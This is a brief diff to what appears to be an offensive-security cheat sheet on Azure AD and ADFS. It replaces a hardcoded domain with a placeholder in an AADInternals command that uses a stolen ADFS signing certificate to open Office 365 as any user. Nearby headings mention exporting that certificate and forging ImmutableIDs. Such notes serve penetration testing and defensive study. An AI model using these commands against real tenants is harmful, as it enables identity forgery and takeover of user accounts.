@@ -239,7 +239,7 @@ Export-AADIntADFSSigningCertificate
 
 #### Access cloud apps as any user
 ```
-Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
+Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
 ```
 
 ### With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!
